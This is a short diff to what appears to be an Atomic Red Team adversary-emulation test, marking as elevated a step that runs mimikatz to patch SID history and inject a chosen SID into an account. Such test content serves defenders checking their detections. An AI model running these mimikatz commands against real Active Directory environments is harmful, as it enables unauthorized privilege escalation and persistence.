@@ -37,7 +37,7 @@ atomic_tests:
       Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
   executor:
     name: command_prompt
-    elevation_required: false
+    elevation_required: true
     command: |
       #{mimikatz_path} "privilege::debug" "sid::patch" "sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}" "exit"
     cleanup_command: |
